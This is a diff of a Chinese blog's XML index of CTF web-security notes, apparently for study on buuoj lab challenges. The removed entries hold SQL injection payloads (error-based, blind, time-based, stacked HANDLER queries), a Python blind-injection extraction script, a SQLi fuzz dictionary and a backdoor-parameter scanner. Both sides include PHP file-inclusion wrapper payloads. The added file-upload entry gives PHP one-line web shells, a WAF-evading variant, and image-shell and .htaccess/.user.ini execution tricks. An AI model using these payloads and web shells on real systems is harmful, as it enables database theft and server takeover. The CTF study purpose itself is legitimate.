0，1来实现。</p><p>^extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>同updatexml一样，限制长度也是32位。<br> se//mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误  。和updatexml语法一样注意参数不同就可以了。<br>！！！ select()   select 与()之间不要加空格</p><p><a href="http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=%27%5Eextractvalue(1,concat(0x7e,(select(database())),0x7e))%23">http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=%27^extractvalue(1,concat(0x7e,(select(database())),0x7e))%23</a></p><p>username=aaa&amp;password=aaa’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’))))%23<br>#语句主要用()绕过了空格，用like绕过了=号</p><p><a href="http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=&#39;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e))%23">http://0b710a62-0e36-4747-b70d-6aadcdc04a2e.node4.buuoj.cn:81/check.php?username=admin&amp;password=&#39;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e))%23</a></p><p>select exp(<del>(select * FROM(SELECT USER())a)) //double 数值类<br>型超出范围<br>//Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上<br><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;">http://127.0.0.1/sqllib/Less-5/?id=1&#39;</a> union select (exp(</del>(select * FROM(SELECT USER())a))),2, 3–+</p><p>select !(select * from (select user())x) -（ps:这是减号） <del>0<br>//bigint 超出范围；</del>0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上</p><p><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;">http://127.0.0.1/sqllib/Less-5/?id=1&#39;</a> union select (!(select * from (select user())x) - ~0),2,3-<br>-+</p><p>延时注入：<br><a href="http://127.0.0.1/sqllib/Less-5/?id=1&#39;and">http://127.0.0.1/sqllib/Less-5/?id=1&#39;and</a> If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p><p>联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据<br>利用/<em>!union</em>/可以绕过对union的过滤<br>异或<br>可以起到代替or的作用<br>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p><p>SQL注入一点小技巧<br>当 = 被过滤时，用 regexp 来代替 = ，用 &lt;&gt; 代替 !=</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> SQL </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> sql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>handler--select</title>
-      <link href="/2021/10/08/handler--select/"/>
-      <url>/2021/10/08/handler--select/</url>
-      
-        <content type="html"><![CDATA[<p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。<br>句柄 相当于一个指针，是一个广义的指针，不是特定指向某一个形式（整数、数组、对象等）</p><h1 id="打开一个表名为-tbl-name-的表的句柄"><a href="#打开一个表名为-tbl-name-的表的句柄" class="headerlink" title="打开一个表名为 tbl_name 的表的句柄"></a>打开一个表名为 tbl_name 的表的句柄</h1><p>HANDLER tbl_name OPEN [ [AS] alias]</p><h1 id="1、通过指定索引查看表，可以指定从索引那一行开始，通过-NEXT-继续浏览"><a href="#1、通过指定索引查看表，可以指定从索引那一行开始，通过-NEXT-继续浏览" class="headerlink" title="1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览"></a>1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览</h1><p>HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,…)<br>    [ WHERE where_condition ] [LIMIT … ]</p><h1 id="2、通过索引查看表"><a href="#2、通过索引查看表" class="headerlink" title="2、通过索引查看表"></a>2、通过索引查看表</h1><h1 id="FIRST-获取第一行（索引最小的一行）"><a href="#FIRST-获取第一行（索引最小的一行）" class="headerlink" title="FIRST: 获取第一行（索引最小的一行）"></a>FIRST: 获取第一行（索引最小的一行）</h1><h1 id="NEXT-获取下一行"><a href="#NEXT-获取下一行" class="headerlink" title="NEXT: 获取下一行"></a>NEXT: 获取下一行</h1><h1 id="PREV-获取上一行"><a href="#PREV-获取上一行" class="headerlink" title="PREV: 获取上一行"></a>PREV: 获取上一行</h1><h1 id="LAST-获取最后一行（索引最大的一行）"><a href="#LAST-获取最后一行（索引最大的一行）" class="headerlink" title="LAST: 获取最后一行（索引最大的一行）"></a>LAST: 获取最后一行（索引最大的一行）</h1><p>HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }<br>    [ WHERE where_condition ] [LIMIT … ]</p><h1 id="3、不通过索引查看表"><a href="#3、不通过索引查看表" class="headerlink" title="3、不通过索引查看表"></a>3、不通过索引查看表</h1><h1 id="READ-FIRST-获取句柄的第一行"><a href="#READ-FIRST-获取句柄的第一行" class="headerlink" title="READ FIRST: 获取句柄的第一行"></a>READ FIRST: 获取句柄的第一行</h1><h1 id="READ-NEXT-依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）"><a href="#READ-NEXT-依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）" class="headerlink" title="READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）"></a>READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）</h1><h1 id="最后一行执行之后再执行-READ-NEXT-会返回一个空的结果"><a href="#最后一行执行之后再执行-READ-NEXT-会返回一个空的结果" class="headerlink" title="最后一行执行之后再执行 READ NEXT 会返回一个空的结果"></a>最后一行执行之后再执行 READ NEXT 会返回一个空的结果</h1><p>HANDLER tbl_name READ { FIRST | NEXT }<br>    [ WHERE where_condition ] [LIMIT … ]</p><h1 id="关闭已打开的句柄"><a href="#关闭已打开的句柄" class="headerlink" title="关闭已打开的句柄"></a>关闭已打开的句柄</h1><p>HANDLER tbl_name CLOSE</p><p>实战：<br><a href="http://fa463541-8469-420e-a928-d97bbb9039c3.node4.buuoj.cn:81/?inject=1&#39;;HANDLER">http://fa463541-8469-420e-a928-d97bbb9039c3.node4.buuoj.cn:81/?inject=1&#39;;HANDLER</a> FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> SQL </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> sql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql盲注脚本</title>
-      <link href="/2021/10/08/%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"/>
-      <url>/2021/10/08/%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/</url>
-      
-        <content type="html"><![CDATA[<p>import requests<br>url = ‘<a href="http://9b2dfbf9-7ef6-4104-bb7b-d4aad1150ace.node4.buuoj.cn:81/index.php&#39;">http://9b2dfbf9-7ef6-4104-bb7b-d4aad1150ace.node4.buuoj.cn:81/index.php&#39;</a><br>result = ‘’<br>for i in range(1, 1000):<br>    low = 30<br>    high = 200<br>    mid = (low + high) // 2<br>    while high &gt; low:<br>        payload = “id=0^if((ascii(substr((select(flag)from(flag)),” + str(i) + “,1)))&gt;” + str(mid) + “,1,2)”<br>        print(payload)<br>        data = {<br>            “id”: payload<br>        }<br>        response = requests.post(url, data=data)</p><pre><code>    if &quot;Hello&quot; in response.text:        low = mid+1    else:        high = mid    mid = (low + high) // 2result += chr(int(mid))print(result)</code></pre><p>print(result)</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> 脚本 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 脚本 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>当information_schema被禁用</title>
-      <link href="/2021/10/08/%E5%BD%93information_schema%E8%A2%AB%E7%A6%81%E7%94%A8/"/>
-      <url>/2021/10/08/%E5%BD%93information_schema%E8%A2%AB%E7%A6%81%E7%94%A8/</url>
-      
-        <content type="html"><![CDATA[<p>mysql在被waf禁掉了information_schema库后利用思路<br>information_schema<br>简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。</p><p>MySQL5.7的新特性<br>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。<br>schema_auto_increment_columns，该视图的作用简单来说就是用来对表自增ID的监控。<br>mysql默认是关闭InnoDB存储引擎的<br>想通过注入获取到没有自增主键的表的数据怎么办？<br>schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffe<br>payload:<br> schema_auto_increment_columns<br> ?id=-1’ union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()–+</p><p>schema_table_statistics_with_buffer<br>?id=-1’ union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()–+</p><p>获取字段名</p><p>获取第一列的列名 ?id=-1’ union all select*from (select * from users as a join users b)c–+</p><p>获取次列及后续列名</p><p>?id=-1’ union all select*from (select * from users as a join users b using(id,username))c–+<br>一般要超级管理员才可以访问sys<br>在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。</p><p>(select <code>2</code> from (select 1,2,3 union select * from table_name)a)  //前提是要知道表名<br>((select c from (select 1,2,3 c union select * from users)b))    1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量</p><p>如果表引擎为innodb<br>并且MYSQL&gt;5.5<br>innodb_table_stats、innodb_table_index存放所以库名表名<br>select table_name from mysql.innodb_table_stats where database_name=库名;</p><p>方法三：<br>爆库名、表名、字段名<br>当过滤information_schema等关键字时，可以用下面方法爆库名<br>select 1,2,3 from users where 1=abc()<br>–&gt;ERROR 1305(42000):FUNCTION fl4g.abc does not exist<br>爆表名：<br>通过polygon ()报错<br>and polygon (()select * from(select user ())a)b );</p><p>select 1,2,3 from users where Polygon(id);<br>slect 1,2,3 from users where linestring(id);<br>ERROR 1367(22007):lllegal non geometric ‘<code>fl4g</code>.<code>users</code>.<code>id</code>‘value found during parsing<br>爆Column<br>通过linestring ()报错<br>and linestring (()select * from(select user() )a)b );</p><p>select 1,2,3 from users where (select * from (select * from users as a join users as b)as c);<br>ERROR 1060(42s21):Duplicate column name ‘id’<br>select 1,2,3 from users where (select * from (select * from users as a join users as b using(id))as c);<br>ERROR 1060(42s21):Duplicate column name ‘username’<br>前提是users表存在</p><p>1’/<strong>/union/</strong>/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22’%23<br>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’ limit 0,1’ at line 1</p><p>-1’/<strong>/union/</strong>/select/<strong>/1, (select/</strong>/group_concat(a)/<strong>/from(select/</strong>/1,2/<strong>/as/</strong>/a,3/<strong>/as/</strong>/b/<strong>/union/</strong>/sele ct*from/<strong>/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/</strong>/‘</p><p>-1’/<strong>/union/</strong>/select/<strong>/1, (select/</strong>/group_concat(b)/<strong>/from(select/</strong>/1,2/<strong>/as/</strong>/a,3/<strong>/as/</strong>/b/<strong>/union/</strong>/sele ct*from/<strong>/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/</strong>/‘</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> SQL </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> sql </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>sql-fuzz测试字典</title>
-      <link href="/2021/10/08/sql-fuzz%E6%B5%8B%E8%AF%95%E5%AD%97%E5%85%B8/"/>
-      <url>/2021/10/08/sql-fuzz%E6%B5%8B%E8%AF%95%E5%AD%97%E5%85%B8/</url>
-      
-        <content type="html"><![CDATA[<p>length<br>+<br>handler<br>like<br>select<br>sleep<br>database<br>delete<br>having<br>or<br>as<br>-~<br>BENCHMARK<br>limit<br>left<br>select<br>insert<br>sys.schema_auto_increment_columns<br>join<br>right<br>#<br>&amp;<br>&amp;&amp;<br><br>handler</p><hr><p>–<br>–+<br>INFORMATION<br>–<br>;<br>!<br>%<br>+<br>xor<br>&lt;&gt;<br>(</p><blockquote></blockquote><p>&lt;<br>)<br>.<br>^<br>=<br>AND<br>BY<br>CAST<br>COLUMN<br>COUNT<br>CREATE<br>END<br>case<br>‘1’=’1<br>when<br>admin’<br>“<br>length<br>+<br>length<br>REVERSE<br>ascii<br>select<br>database<br>left<br>right<br>‘<br>union<br>||<br>oorr<br>/<br>//<br>//*<br><em>/</em><br>/**/<br>anandd<br>GROUP<br>HAVING<br>IF<br>INTO<br>JOIN<br>LEAVE<br>LEFT<br>LEVEL<br>sleep<br>LIKE<br>NAMES<br>NEXT<br>NULL<br>OF<br>ON<br>|<br>infromation_schema<br>user<br>OR<br>ORDER<br>ORD<br>SCHEMA<br>SELECT<br>SET<br>TABLE<br>THEN<br>UPDATE<br>USER<br>USING<br>VALUE<br>VALUES<br>WHEN<br>WHERE<br>ADD<br>AND<br>prepare<br>set<br>update<br>delete<br>drop<br>inset<br>CAST<br>COLUMN<br>CONCAT<br>GROUP_CONCAT<br>group_concat<br>CREATE<br>DATABASE<br>DATABASES<br>alter<br>DELETE<br>DROP<br>floor<br>rand()<br>information_schema.tables<br>TABLE_SCHEMA<br>%df<br>concat_ws()<br>concat<br>LIMIT<br>ORD<br>ON<br>extractvalue<br>order<br>CAST()<br>by<br>ORDER<br>OUTFILE<br>RENAME<br>REPLACE<br>SCHEMA<br>SELECT<br>SET<br>updatexml<br>SHOW<br>SQL<br>TABLE<br>THEN<br>TRUE<br>instr<br>benchmark<br>format<br>bin<br>substring<br>ord<br>UPDATE<br>VALUES<br>VARCHAR<br>VERSION<br>WHEN<br>WHERE<br>/*<br>`<br>,<br>users<br>%0a<br>%0b<br>mid<br>for<br>BEFORE<br>REGEXP<br>RLIKE<br>in<br>sys schemma<br>SEPARATOR<br>XOR<br>CURSOR<br>FLOOR<br>sys.schema_table_statistics_with_buffer<br>INFILE<br>count<br>%0c<br>from<br>%0d<br>%a0<br>=<br>@<br>else<br>substr</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> 字典 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 字典 </tag>
             
         </tags>
       
@@ -1174,16 +923,16 @@
           
           <category> CTF </category>
           
-          <category> 反序列化 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> php </tag>
-            
             <tag> 反序列化 </tag>
+            
+            <tag> 网络安全 </tag>
             
         </tags>
       
@@ -1203,7 +952,7 @@
           
           <category> CTF </category>
           
-          <category> 杂 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -1230,7 +979,7 @@
           
           <category> CTF </category>
           
-          <category> 绕过 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -1238,33 +987,6 @@
         <tags>
             
             <tag> 绕过 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>从网站源码中寻找脚本后门</title>
-      <link href="/2021/10/08/%E4%BB%8E%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%90%8E%E9%97%A8%E8%84%9A%E6%9C%AC/"/>
-      <url>/2021/10/08/%E4%BB%8E%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%90%8E%E9%97%A8%E8%84%9A%E6%9C%AC/</url>
-      
-        <content type="html"><![CDATA[<p>import os<br>import requests<br>import re<br>import threading<br>import time<br>print(‘开始时间：  ‘+  time.asctime( time.localtime(time.time()) ))<br>s1=threading.Semaphore(100)                                            #这儿设置最大的线程数<br>filePath = r”D:/soft/phpstudy/PHPTutorial/WWW/src/“<br>os.chdir(filePath)                                                    #改变当前的路径<br>requests.adapters.DEFAULT_RETRIES = 5                                #设置重连次数，防止线程数过高，断开连接<br>files = os.listdir(filePath)<br>session = requests.Session()<br>session.keep_alive = False                                             # 设置连接活跃状态为False<br>def get_content(file):<br>    s1.acquire()<br>    print(‘trying   ‘+file+ ‘     ‘+ time.asctime( time.localtime(time.time()) ))<br>    with open(file,encoding=’utf-8’) as f:                            #打开php文件，提取所有的$_GET和$_POST的参数<br>            gets = list(re.findall(‘$_GET[&#39;(.<em>?)&#39;]‘, f.read()))<br>            posts = list(re.findall(‘$_POST[&#39;(.</em>?)&#39;]‘, f.read()))<br>    data = {}                                                        #所有的$_POST<br>    params = {}                                                        #所有的$_GET<br>    for m in gets:<br>        params[m] = “echo ‘xxxxxx’;”<br>    for n in posts:<br>        data[n] = “echo ‘xxxxxx’;”<br>    url = ‘<a href="http://127.0.0.1/src/&#39;+file">http://127.0.0.1/src/&#39;+file</a><br>    req = session.post(url, data=data, params=params)            #一次性请求所有的GET和POST<br>    req.close()                                                # 关闭请求  释放内存<br>    req.encoding = ‘utf-8’<br>    content = req.text<br>    #print(content)<br>    if “xxxxxx” in content:                                    #如果发现有可以利用的参数，继续筛选出具体的参数<br>        flag = 0<br>        for a in gets:<br>            req = session.get(url+’?%s=’%a+”echo ‘xxxxxx’;”)<br>            content = req.text<br>            req.close()                                                # 关闭请求  释放内存<br>            if “xxxxxx” in content:<br>                flag = 1<br>                break<br>        if flag != 1:<br>            for b in posts:<br>                req = session.post(url, data={b:”echo ‘xxxxxx’;”})<br>                content = req.text<br>                req.close()                                                # 关闭请求  释放内存<br>                if “xxxxxx” in content:<br>                    break<br>        if flag == 1:                                                    #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，<br>            param = a<br>        else:<br>            param = b<br>        print(‘找到了利用文件： ‘+file+”  and 找到了利用的参数：%s” %param)<br>        print(‘结束时间：  ‘ + time.asctime(time.localtime(time.time())))<br>    s1.release()</p><p>for i in files:                                                            #加入多线程<br>   t = threading.Thread(target=get_content, args=(i,))<br>   t.start()</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> 杂 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> python编程 </tag>
             
         </tags>
       
@@ -1300,18 +1022,18 @@
     
     
     <entry>
-      <title>PHP文件包含常见协议</title>
-      <link href="/2021/10/08/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/"/>
-      <url>/2021/10/08/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/</url>
+      <title>PHP常见协议</title>
+      <link href="/2021/10/08/PHP%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/"/>
+      <url>/2021/10/08/PHP%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/</url>
       
-        <content type="html"><![CDATA[<p>php&gt;=5.2<br>php://filter协议   ?file=file://D:/soft/phpStudy/WWW/phpcode.txt<br>php://input协议  ?file=php://filter/read=convert.base64-encode/resource=./index.php<br>data://协议<br>data://协议允许读入<br> 要求：打开allow_url_fopen  allow_url_include<br>?file=data://text/plain,<?php phpinfo()?><br>?file=data://text/plain;base64,编码</p><p>file协议：<br>file:///文件路径</p><p>如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>php&gt;=5.2<br>php://filter协议   ?file=file://D:/soft/phpStudy/WWW/phpcode.txt<br>php://input协议  ?file=php://filter/read=convert.base64-encode/resource=./index.php<br>data://协议<br>data://协议允许读入<br> 要求：打开allow_url_fopen  allow_url_include<br>?file=data://text/plain,<?php phpinfo()?><br>?file=data://text/plain;base64,编码</p><p>file协议：<br>file:///文件路径</p>]]></content>
       
       
       <categories>
           
           <category> CTF </category>
           
-          <category> 代码\命令执行类 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
@@ -1327,52 +1049,25 @@
     
     
     <entry>
-      <title>nginx重要文件位置</title>
-      <link href="/2021/10/08/nginx%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE/"/>
-      <url>/2021/10/08/nginx%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE/</url>
+      <title>文件上传</title>
+      <link href="/2021/09/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+      <url>/2021/09/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
       
-        <content type="html"><![CDATA[<p>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> CTF </category>
-          
-          <category> 杂 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> nginx </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>PHP文件包含常见协议</title>
-      <link href="/2021/10/08/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8/"/>
-      <url>/2021/10/08/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8/</url>
-      
-        <content type="html"><![CDATA[<p>pre_replace /e模式是要在正则匹配到特定特征的字符串直接当作php代码来执行，执行结果替换原字符，相当于eval函数。<br>payload:next.php?\S*=${getflag()}&amp;cmd=system(‘ls /‘);</p><h2 id="绕过preg-match的话可以使用-绕过，比如在linux下执行l-s，效果等同于ls"><a href="#绕过preg-match的话可以使用-绕过，比如在linux下执行l-s，效果等同于ls" class="headerlink" title="绕过preg_match的话可以使用\绕过，比如在linux下执行l\s，效果等同于ls"></a>绕过preg_match的话可以使用\绕过，比如在linux下执行l\s，效果等同于ls</h2><h2 id="call-user-func-函数-参数-，返回值为函数执行参数后的结果"><a href="#call-user-func-函数-参数-，返回值为函数执行参数后的结果" class="headerlink" title="call_user_func(函数, 参数)，返回值为函数执行参数后的结果"></a>call_user_func(函数, 参数)，返回值为函数执行参数后的结果</h2><p>intval() 函数用于获取变量的整数值。</p><p>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>PHP 4, PHP 5, PHP 7<br>语法</p><p>int intval ( mixed $var [, int $base = 10 ] )</p><pre><code>$var：要转换成 integer 的数量值。$base：转化所使用的进制。</code></pre><p>intval()函数的使用方式，发现如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值而对于科学计数法+数字则会返回字符串类型<br>示例：<br>&lt;?php<br>$num=’2e4’;<br>echo(intval($num));  ——-&gt;2<br>echo(intval($num+1));———&gt;20001</p><hr><p>require_once(dirname(<strong>FILE</strong>).”/./config_uc.php”);<br>一、<strong>FILE</strong> php定义的为当前文件路径及文件名的常量，如: d:/wwwroot/dedecms/index.php<br>二、dirname(<strong>FILE</strong>) 为函数，取得文件路径的目录名；<br>echo dirname(“d:/wwwroot/dedecms/index.php”）结果为：d:/wwwroot/dedecms<br>三、require_once(dirname(<strong>FILE</strong>).”/./config_uc.php”); 假设当前文件为d:/wwwroot/dedecms/index.php结果为<br>require_once(“d:/wwwroot/dedecms/config_uc.php”);</p><p>另外/./config_uc.php 中./为当前目录</p><p>require_once(str_replace(‘/tieba’,’’,dirname(<strong>FILE</strong>)).”/./config_uc.php”); </p><p>“/./config_uc.php” 这个就是文件路径了<br>/./应该是表示当前目录<br>/../可以表示上级目录</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="一句话木马制作"><a href="#一句话木马制作" class="headerlink" title="一句话木马制作"></a>一句话木马制作</h1><p>正常：</p><pre><code class="php">&lt;?php@eval($_POST[&#39;x&#39;]);?&gt;</code></pre><p>如果有&lt;?过滤，采用：</p><pre><code class="php">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[x])&lt;/script&gt;</code></pre><p>一种简单的绕安全狗方法：变量传递</p><pre><code class="php">&lt;?php$a=$_GET[&#39;x&#39;];$$a=$_GET[&#39;y&#39;];$b($_POST[&#39;z&#39;]);</code></pre><pre><code class="php">传入方法：http://php?x=b&amp;y=assertpost:z=phpinfo();</code></pre><p>问：为什么这里不用eval<br>因为eval赋值给b没有效果的。</p><p>对传入数据进行加密</p><pre><code class="php">&lt;?php assert(base64_decode($_POST[&#39;x&#39;]));?&gt;</code></pre><p>当这种情况用蚁剑连接时，需要采用base64加密。</p><h1 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h1><p>1.首先图片命名111.jpg</p><p>2.再新建222.asp文件，一句话木马写入</p><p>3.然后win+R，cmd，cd到之前图片的目录路径下，命令为copy 111.jpg/b+222.asp/a 333.jpg</p><p>最后就会出现新的图片3333.jpg，就是制作出的图片马。</p><h1 id="文件上传之后缀替换"><a href="#文件上传之后缀替换" class="headerlink" title="文件上传之后缀替换"></a>文件上传之后缀替换</h1><p>php2，php3、php4、php5，pht，phtml，phps</p><p>.JPEG;.JPE;.JPG，”JPGGraphic File”<br>.gif，”GIF89A”<br> .zip，”Zip Compressed”<br>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p><h1 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h1><p>.user.ini。<br>利用条件：含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了</p><p>它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm/fastcgi，我的IIS php5.3以上的全部用的fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。</p><p>CGI全称”通用网关接口”（Common Gateway Interface），用于HTTP服务器与其它机器上的程序服务通信交流的一种工具，CGI程序须运行在网络服务器上<br>FastCGI是一个可伸缩地、高速地在HTTP服务器和动态脚本语言间通信的接口（FastCGI接口在Linux下是socket（可以是文件socket，也可以是ip socket）），主要优点是把动态语言和HTTP服务器分离开来。多数流行的HTTP服务器都支持FastCGI，包括Apache、Nginx和lightpd。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的</p><p>auto_append_file<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数<br>auto_prepend_file 是在文件后面包含</p><p>使用方法很简单，直接写在.user.ini中：</p><p>auto_prepend_file=01.gif</p><h1 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h1><p>针对apache</p><p>文件后缀为 .htaccess<br>保存类型为所有文件</p><p>上传.htaccess 必须是网站根路径 </p><p>让png解析为php</p><p>可以在.htaccess 加入php解析规则<br>类似于把文件名包含1的解析成php</p><pre><code class="php">&lt;FilesMatch &quot;1&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;123456.png  就会以php执行</code></pre>]]></content>
       
       
       <categories>
           
           <category> CTF </category>
           
-          <category> 常见函数 </category>
+          <category> 常见漏洞和手法 </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> php </tag>
+            <tag> 文件上传 </tag>
             
         </tags>
       
